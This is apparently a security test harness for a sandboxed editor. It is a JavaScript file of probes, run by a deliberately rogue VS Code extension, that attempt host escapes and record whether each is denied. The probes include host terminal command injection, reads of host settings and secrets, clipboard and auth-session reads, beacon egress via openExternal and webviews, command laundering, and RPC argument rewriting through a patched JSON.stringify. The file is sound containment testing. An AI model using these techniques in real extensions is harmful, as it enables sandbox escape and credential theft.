// RPC escape probes, run from inside a tab by the rogue extension.
//
// Each probe attempts one concrete escape named in rpc-filter/policy/policy.json
// and records whether it SUCCEEDED or was DENIED. It never asserts: the harness
// decides, because the expected outcome differs by build.
//
//   unpatched build -> every probe must SUCCEED. A probe that has never
//                      succeeded proves nothing; it may simply be broken.
//   patched build   -> every probe must be DENIED.
//
// Probes are deliberately written against the public extension API wherever the
// escape is reachable that way, because that is what a real rogue extension
// has. Escapes that need raw RPC or an IPC channel live in the rogue-REH
// fixture instead: the extension host cannot reach them.
//
// Only ever run against our own local builds. Never against anything else.

const safety = require('./probe-safety.js');

const SUCCEEDED = 'succeeded';
const DENIED = 'denied';
const ERROR = 'error';

/**
 * Best-effort hint only. The filter deliberately makes a denial look like an
 * unsupported operation to the tab, so the message cannot reliably separate
 * "denied" from "broken" -- and treating it as authoritative is how a probe
 * that fails for an incidental reason gets scored as containment. The host-side
 * denial log is the real oracle; check-probes.ts corroborates against it and
 * does not trust this field alone.
 */
function classify(err) {
	const msg = String(err && err.message ? err.message : err);
	// A safety refusal is a harness fault. It must never look like a denial,
	// or a mis-targeted probe would read as containment.
	if (err && err.seclabSafety) {
		return { outcome: ERROR, detail: msg };
	}
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation/i.test(msg)) {
		return { outcome: DENIED, detail: msg };
	}
	return { outcome: ERROR, detail: msg };
}

async function probe(results, id, policyRef, fn) {
	const started = Date.now();
	try {
		const detail = await fn();
		results.push({
			id, policyRef, outcome: SUCCEEDED,
			detail: typeof detail === 'string' ? detail : JSON.stringify(detail ?? null),
			ms: Date.now() - started,
		});
	} catch (err) {
		const { outcome, detail } = classify(err);
		results.push({ id, policyRef, outcome, detail, ms: Date.now() - started });
	}
}

/**
 * @param vscode the extension API
 * @param context the extension context
 * @param targets parsed .seclab/targets: canary, marker, beacon, othertab
 */
async function runProbes(vscode, context, targets) {
	const results = [];
	// Inert unless the harness armed this run. Installed anywhere else -- or
	// run against a user's real profile -- the probes do nothing at all.
	const ctx = safety.context(targets);
	if (!ctx.armed) {
		return [{
			id: 'harness', policyRef: '', outcome: ERROR,
			detail: `not armed: ${ctx.reason}`,
		}];
	}
	const Uri = vscode.Uri;
	// `vscode-userdata:` paths are the host profile's own absolute path (the
	// isolated ~/.seclab-test profile the harness launched), which a tab cannot
	// know, so the harness writes it into the run's targets. Without it the
	// probes named `vscode-userdata:/User/...`, a path that does not exist, and
	// failed on the unfiltered build for that reason alone (2026-11-09).
	const userDataUri = rel => {
		if (!targets.userdata || !/\/\.seclab-test\//.test(targets.userdata)) {
			throw new safety.SafetyError('userdata: the harness named no isolated profile');
		}
		return Uri.from({ scheme: 'vscode-userdata', path: `${targets.userdata}/User/${rel}` });
	};
	const beacon = ctx.beaconPort ? `http://127.0.0.1:${ctx.beaconPort}` : null;

	// --- host code execution -------------------------------------------------
	// workbench.action.terminal.newLocal creates a terminal on the HOST even in a
	// remote window; sendSequence then types into it. Together they are the
	// canonical confused-deputy chain.
	await probe(results, 'host-terminal-newlocal', 'cmd:workbench.action.terminal.newLocal',
		() => vscode.commands.executeCommand('workbench.action.terminal.newLocal'));
	await probe(results, 'host-terminal-sendsequence', 'cmd:workbench.action.terminal.sendSequence',
		() => vscode.commands.executeCommand('workbench.action.terminal.sendSequence',
			// Its own marker suffix, so the evidence is specific to this chain.
			// The shared marker is written by several vectors, so a check on it
			// alone cannot say *which* one reached the host -- and after a patch
			// it cannot say whether this chain was denied or some unrelated
			// vector simply did not run. A named marker makes the claim
			// "newLocal + sendSequence reached the host" falsifiable on its own.
			{ text: safety.markerCommand(ctx, '-newlocal') }));

	// --- host filesystem -----------------------------------------------------
	// $readFile accepts any scheme the IFileService can resolve. vscode-userdata:
	// reaches the real user settings, which hold a seeded canary.
	await probe(results, 'host-fs-read-userdata', 'rpc:MainThreadFileSystem.$readFile',
		async () => {
			const buf = await vscode.workspace.fs.readFile(userDataUri('settings.json'));
			return Buffer.from(buf).toString('utf8').slice(0, 4096);
		});
	await probe(results, 'host-fs-read-file-scheme', 'rpc:MainThreadFileSystem.$readFile',
		async () => {
			const buf = await vscode.workspace.fs.readFile(
				Uri.file(safety.safePath(ctx, ctx.canary, 'canary read')));
			return Buffer.from(buf).toString('utf8');
		});
	await probe(results, 'host-fs-write-file-scheme', 'rpc:MainThreadFileSystem.$writeFile',
		async () => {
			const target = Uri.file(safety.safeWrite(ctx, `${ctx.marker}.rpcwrite`, 'marker write'));
			safety.note(ctx, `${ctx.marker}.rpcwrite`);
			await vscode.workspace.fs.writeFile(target, Buffer.from('written by a tab\n'));
			return target.toString();
		});

	// A `file:` write from a remote window is served by the REH's own provider,
	// inside the tab, so it proves nothing about the host (2026-11-04 run).
	// `vscode-userdata:` resolves against the HOST profile directory, so it is
	// the scheme that actually crosses the boundary.
	await probe(results, 'host-fs-write-userdata', 'rpc:MainThreadFileSystem.$writeFile',
		async () => {
			const target = userDataUri('seclab-probe-marker.txt');
			await vscode.workspace.fs.writeFile(target, Buffer.from('written by a tab\n'));
			return target.toString();
		});

	// --- secrets -------------------------------------------------------------
	// SecretStorage is keyed {extensionId, key} globally, so a value written in
	// one tab is readable in another by the same extension. The harness opens two
	// tabs and compares.
	await probe(results, 'secret-write-own', 'rpc:MainThreadSecretState.$setPassword',
		async () => {
			await context.secrets.store('seclab-probe', `from-${process.env.SECLAB_TAB_ID ?? 'unknown'}`);
			return 'stored';
		});
	await probe(results, 'secret-read-cross-tab', 'rpc:MainThreadSecretState.$getPassword',
		async () => (await context.secrets.get('seclab-probe')) ?? '(absent)');

	// --- credentials ---------------------------------------------------------
	// getSession must return a sentinel, never a reusable token. The canary
	// harness checks the value; this records whether a session came back at all.
	await probe(results, 'auth-get-session', 'rpc:MainThreadAuthentication.$getSession',
		async () => {
			// A fake provider seeded by the harness in the isolated user-data-dir.
			// Never the user's real GitHub or Microsoft session.
			const provider = process.env.SECLAB_FAKE_AUTH_PROVIDER || 'seclab-fake-auth';
			const s = await vscode.authentication.getSession(provider, ['repo'], { silent: true });
			return s ? { account: s.account?.label ?? null, tokenLength: String(s.accessToken ?? '').length } : null;
		});
	// The clipboard routinely holds a token the user just copied. So it is read
	// only when the run seeded it with a canary (SECLAB_CANARY_CLIPBOARD=1 writes
	// `clipboard=1` into the targets, and restores the user's clipboard after):
	// on 2026-11-09 this probe read the user's real clipboard on an unfiltered
	// build, which is exactly what a probe must never do.
	await probe(results, 'clipboard-read', 'rpc:MainThreadClipboard.$readText',
		async () => {
			if (targets.clipboard !== '1') {
				throw new safety.SafetyError('clipboard: not seeded by this run (SECLAB_CANARY_CLIPBOARD=1)');
			}
			return /seclabcanary_/.test(await vscode.env.clipboard.readText()) ? 'canary read' : 'no canary';
		});

	// --- egress around the broker -------------------------------------------
	// openExternal hands a URI to the HOST opener, so it leaves the tab without
	// passing the tab's broker. A beacon hit proves egress, not just a return
	// value.
	if (beacon) {
		await probe(results, 'open-external-silent', 'rpc:MainThreadWindow.$openUri',
			() => vscode.env.openExternal(Uri.parse(safety.safeUrl(ctx, `${beacon}/open-external`, 'openExternal'))));
		await probe(results, 'as-external-uri', 'rpc:MainThreadWindow.$asExternalUri',
			async () => (await vscode.env.asExternalUri(Uri.parse(safety.safeUrl(ctx, `${beacon}/as-external`, 'asExternalUri')))).toString());
		// Webviews render in the LOCAL trusted renderer, so their fetches have the
		// host's network position and bypass the tab broker entirely.
		await probe(results, 'webview-egress', 'data:webview-content',
			async () => {
				const panel = vscode.window.createWebviewPanel('seclabProbe', 'probe',
					{ viewColumn: 1, preserveFocus: true }, { enableScripts: true });
				panel.webview.html = `<!doctype html><script>
					fetch(${JSON.stringify(safety.safeUrl(ctx, `${beacon}/webview`, 'webview'))}, { mode: 'no-cors' })
						.catch(() => {});
				</script>`;
				await new Promise(r => setTimeout(r, 2000));
				panel.dispose();
				return 'webview rendered; check the beacon log';
			});
	}

	// --- reconnaissance ------------------------------------------------------
	// $getCommands must not hand back the full registry: it tells an attacker
	// exactly which host commands exist to try.
	await probe(results, 'command-enumeration', 'rpc:MainThreadCommands.$getCommands',
		async () => {
			const all = await vscode.commands.getCommands(true);
			const dangerous = all.filter(c => c.startsWith('_remoteCLI.')
				|| c === 'workbench.action.terminal.newLocal');
			return { total: all.length, dangerousVisible: dangerous };
		});

	// --- verdict laundering --------------------------------------------------
	// The real shape, from upstream: _remoteCLI.windowOpen's handler resolves
	// ICommandService from its accessor and executes _files.windowOpen. Denying
	// only the inner id leaves the outer one as a working path.
	await probe(results, 'launder-direct', 'cmd:_remoteCLI.windowOpen',
		() => vscode.commands.executeCommand('_remoteCLI.windowOpen', [], {}));
	await probe(results, 'launder-open-external', 'cmd:_remoteCLI.openExternal',
		() => vscode.commands.executeCommand('_remoteCLI.openExternal',
			safety.safeUrl(ctx, `${beacon}/remotecli`, 'remoteCLI openExternal')));
	await probe(results, 'launder-manage-extensions', 'cmd:_remoteCLI.manageExtensions',
		() => vscode.commands.executeCommand('_remoteCLI.manageExtensions', { list: {} }));

	// Async-hop laundering. These need a host-side command that nests across an
	// await, a timer and an event, which upstream does not provide, so they are
	// driven by the test-only contribution the containment build registers (see
	// rpc-filter/probes/README.md). Without it they report ERROR, not SUCCEEDED,
	// so a missing fixture can never be mistaken for containment.
	for (const hop of ['await', 'timer', 'event', 'captured-service']) {
		await probe(results, `launder-${hop}`, 'cmd:_seclabTest.launder',
			() => vscode.commands.executeCommand('_seclabTest.launder', hop,
				'workbench.action.terminal.newLocal'));
	}

	// --- per-tab state partition (patch 0011) ----------------------------------
	// The storage and secret methods take the extension id as an ARGUMENT, so a
	// tab can name any extension's state. These claim the Tab Manager's id, the
	// trusted UI-side extension whose globalState holds pending routes. The
	// harness seeds a canary under its real key before launch and reads the
	// profile's state database afterwards: a canary in this evidence, or the
	// probe's write under the unpartitioned key, is an escape.
	const TAB_MANAGER = 'seclab.tab-manager';
	await probe(results, 'state-claim-tab-manager-read', 'rpc:MainThreadStorage.$initializeExtensionStorage',
		async () => {
			const storage = findExtHostStorage(context);
			return {
				global: await storage.initializeExtensionStorage(true, TAB_MANAGER) ?? null,
				workspace: await storage.initializeExtensionStorage(false, TAB_MANAGER) ?? null,
			};
		});
	await probe(results, 'state-claim-tab-manager-write', 'rpc:MainThreadStorage.$setValue',
		async () => {
			await findExtHostStorage(context).setValue(true, TAB_MANAGER, { seclabProbeWrite: 'written-by-a-tab' });
			return 'written';
		});
	// SecretState is reached only through a #private field, so the probe does what
	// a rogue extension host can always do: rewrite its own outgoing arguments.
	await probe(results, 'secret-claim-tab-manager-write', 'rpc:MainThreadSecretState.$setPassword',
		async () => {
			const own = String(context.extension.id).toLowerCase();
			await withRewrittenRequest(
				a => a.length === 3 && a[0] === own && a[1] === 'seclab-probe-claim',
				a => [TAB_MANAGER, a[1], a[2]],
				() => context.secrets.store('seclab-probe-claim', 'seclabcanary_probe_write_not_a_secret'));
			return 'written';
		});

	// --- the core editing set, against the host ---------------------------------
	// In a remote extension host `file:` is the TAB's disk (the REH transforms it to
	// vscode-remote), so a probe that means the host names vscode-userdata:, which the
	// trusted side resolves against the host profile. The harness seeds a canary in its
	// settings.json; the probes report only whether it came back, never the text.
	const hostSettings = () => userDataUri('settings.json');
	const sawCanary = s => /seclabcanary_/.test(String(s));
	await probe(results, 'host-doc-open-userdata', 'rpc:MainThreadDocuments.$tryOpenDocument',
		async () => ({ sawHostContent: sawCanary((await vscode.workspace.openTextDocument(hostSettings())).getText()) }));
	await probe(results, 'host-doc-show-userdata', 'rpc:MainThreadTextEditors.$tryShowTextDocument',
		async () => {
			// showTextDocument(hostUri) is refused earlier, at $tryOpenDocument, because the
			// extension host opens the document first; that is the open probe's gate, and
			// corroborating this one against it let a sibling's denial stand in for this
			// probe (review round 14 alert 1). So open the tab's OWN file, and rewrite the
			// outgoing $tryShowTextDocument resource to the host settings, as a rogue
			// extension host can: this reaches the show gate and nothing else.
			const folder = (vscode.workspace.workspaceFolders || [])[0];
			if (!folder) {
				throw new safety.SafetyError('show: no workspace folder');
			}
			const own = await vscode.workspace.openTextDocument(Uri.joinPath(folder.uri, 'eslint.config.js'));
			const editor = await withRewrittenRequest(
				a => a.length === 2 && a[0] && typeof a[0] === 'object' && a[0].path === own.uri.path
					&& a[1] && typeof a[1] === 'object' && 'preserveFocus' in a[1],
				a => [hostSettings().toJSON(), a[1]],
				() => vscode.window.showTextDocument(own, { preserveFocus: true, preview: true }));
			return { sawHostContent: sawCanary(editor.document.getText()) };
		});
	await probe(results, 'host-file-search-nested-uri', 'rpc:MainThreadWorkspace.$startFileSearch',
		async () => {
			// findFiles has no public way to name extra resources, so add one to the
			// outgoing request, as a rogue extension host can.
			const found = await withRewrittenRequest(
				a => a.length === 2 && a[1] && typeof a[1] === 'object' && 'maxResults' in a[1],
				a => [a[0], { ...a[1], extraFileResources: [hostSettings().toJSON()] }],
				() => vscode.workspace.findFiles('**/settings.json', undefined, 10));
			return { sawHostResult: found.some(u => u.scheme === 'vscode-userdata') };
		});
	await probe(results, 'host-fs-activation-scheme', 'rpc:MainThreadFileSystem.$ensureActivation',
		async () => {
			// The extension host sends $ensureActivation(scheme) only for a scheme it serves
			// itself; any other scheme goes straight to $stat, which is a different gate.
			// So serve the probe scheme here first (a local, in-memory provider): the
			// stat then has to ask the trusted side to fire onFileSystem:<scheme> in the
			// UI host, which is the capability this probe is about. Before this the probe
			// reached $stat and never this gate (2026-11-10 proof run).
			const emitter = new vscode.EventEmitter();
			const local = vscode.workspace.registerFileSystemProvider('seclab-probe-scheme', {
				onDidChangeFile: emitter.event,
				watch: () => new vscode.Disposable(() => { }),
				stat: () => ({ type: vscode.FileType.File, ctime: 0, mtime: 0, size: 0 }),
				readDirectory: () => [],
				createDirectory: () => { },
				readFile: () => new Uint8Array(),
				writeFile: () => { },
				delete: () => { },
				rename: () => { },
			});
			try {
				await vscode.workspace.fs.stat(Uri.parse('seclab-probe-scheme:/x'));
				return { activationReached: true };
			} finally {
				local.dispose();
				emitter.dispose();
			}
		});

	// --- provider commands over a host resource --------------------------------
	// _executeCompletionItemProvider / _executeHoverProvider hand the caller's URI
	// to ITextModelService.createModelReference; word-based completion then returns
	// the document's words.
	await probe(results, 'provider-completion-host-file', 'cmd:_executeCompletionItemProvider',
		async () => {
			const list = await vscode.commands.executeCommand('vscode.executeCompletionItemProvider',
				hostSettings(), new vscode.Position(0, 0));
			const labels = (list?.items ?? []).map(i => typeof i.label === 'string' ? i.label : i.label?.label);
			return { items: labels.length, sawHostContent: labels.some(sawCanary) };
		});
	await probe(results, 'provider-hover-host-file', 'cmd:_executeHoverProvider',
		async () => {
			const hovers = await vscode.commands.executeCommand('vscode.executeHoverProvider',
				hostSettings(), new vscode.Position(0, 0));
			return { hovers: Array.isArray(hovers) ? hovers.length : null };
		});

	// --- window context keys --------------------------------------------------
	// _setContext writes the window's global context, so a tab could flip a core
	// when-clause and surface trusted menus for host actions.
	await probe(results, 'setcontext-core-key', 'cmd:_setContext',
		() => vscode.commands.executeCommand('setContext', 'remoteName', 'seclab-probe-spoofed'));

	return results;
}

const RESTART_ID = 'host-restart-extension-host';
const RESTART_REF = 'cmd:workbench.action.restartExtensionHost';

/**
 * workbench.action.restartExtensionHost from the tab (Fork build review OOO-2). Each restart
 * reruns the Tab Manager's resolver, which can repeat its prompts to the user.
 *
 * It runs LAST and ONCE PER RUN, after every other result has been written. Without the filter
 * the call restarts this very extension host, which reactivates this extension: the outcome
 * may never be written by the attempt, and an unguarded rerun would repeat every host-effect
 * probe (and restart again, in a loop). So the attempt (with this host's pid) is recorded in
 * `stateFile` before the call, which is bounded at 20 s. A later activation settles it once:
 * `succeeded` only when that activation runs in a different extension host process. The
 * attempt is never repeated, and the caller then skips the battery.
 *
 * @returns the result, or undefined when the run is not armed
 */
async function runRestartProbe(vscode, targets, stateFile, fs) {
	const ctx = safety.context(targets);
	if (!ctx.armed) {
		return undefined;
	}
	let prior;
	try { prior = JSON.parse(fs.readFileSync(stateFile, 'utf8')); } catch { /* first attempt */ }
	if (prior && prior.id === RESTART_ID) {
		// Settle once, from the next activation. `succeeded` must mean a NEW extension host
		// was observed (a different pid), never just "the outcome was not written": a crash
		// or a hang between attempt and result would otherwise read as a proven restart
		// (review round 14 alert 2).
		if (prior.newHostPid === undefined && process.pid !== prior.attemptPid) {
			// A restart keeps the window, so the session id is unchanged; a window reload
			// gives a new one. And it settles promptly: a new host long after the attempt is
			// something else (a crash-restart, say), not this command (round 15).
			const sameWindow = vscode.env.sessionId === prior.attemptSession;
			const prompt = Date.now() - prior.attempted <= 60000;
			prior.newHostPid = process.pid;
			if (prior.outcome === undefined) {
				prior.outcome = sameWindow && prompt ? SUCCEEDED : ERROR;
			}
			prior.detail = JSON.stringify({ attemptPid: prior.attemptPid, newHostPid: prior.newHostPid, sameWindow, settledMs: Date.now() - prior.attempted, returned: prior.returned ?? null });
			fs.writeFileSync(stateFile, JSON.stringify(prior));
		}
		return prior;
	}
	const attempted = Date.now();
	const attemptPid = process.pid;
	const attemptSession = vscode.env.sessionId;
	fs.writeFileSync(stateFile, JSON.stringify({ id: RESTART_ID, policyRef: RESTART_REF, attempted, attemptPid, attemptSession }));
	const results = [];
	let timer;
	await probe(results, RESTART_ID, RESTART_REF, () => Promise.race([
		vscode.commands.executeCommand('workbench.action.restartExtensionHost'),
		new Promise((_, reject) => { timer = setTimeout(() => reject(new Error('timed out after 20000 ms: the call never settled')), 20000); }),
	]).finally(() => clearTimeout(timer)));
	const r = { ...results[0], attempted, attemptPid, attemptSession };
	if (r.outcome === SUCCEEDED) {
		// Returned before the host went away. Still unproven until a new host settles it.
		r.returned = true;
		delete r.outcome;
		r.detail = JSON.stringify({ attemptPid, newHostPid: null, returned: true });
	}
	fs.writeFileSync(stateFile, JSON.stringify(r));
	return r.outcome === undefined ? { ...r, outcome: ERROR, detail: 'returned; awaiting a new extension host to confirm the restart' } : r;
}

/** Was the restart probe already attempted in this run (so this activation is the restarted one)? */
function restartAttempted(stateFile, fs) {
	try { return JSON.parse(fs.readFileSync(stateFile, 'utf8')).id === RESTART_ID; } catch { return false; }
}

/**
 * The extension host's storage service, reached through the memento's own fields
 * (private, so mangled in a built host, but still own properties). Its public
 * initializeExtensionStorage/setValue take any id.
 */
function findExtHostStorage(context) {
	const seen = new Set();
	let level = [context.globalState];
	for (let depth = 0; depth < 3 && level.length; depth++) {
		const next = [];
		for (const o of level) {
			if (!o || typeof o !== 'object' || seen.has(o)) {
				continue;
			}
			seen.add(o);
			if (typeof o.initializeExtensionStorage === 'function' && typeof o.setValue === 'function') {
				return o;
			}
			next.push(...Object.values(o));
		}
		level = next;
	}
	throw new Error('no extension host storage service reachable from globalState');
}

/** Rewrite the arguments of one outgoing RPC request (serialized with JSON.stringify). */
async function withRewrittenRequest(match, rewrite, fn) {
	const original = JSON.stringify;
	JSON.stringify = function (value, ...rest) {
		return original.call(this, Array.isArray(value) && match(value) ? rewrite(value) : value, ...rest);
	};
	try {
		return await fn();
	} finally {
		JSON.stringify = original;
	}
}

module.exports = { runProbes, runRestartProbe, restartAttempted, SUCCEEDED, DENIED, ERROR };
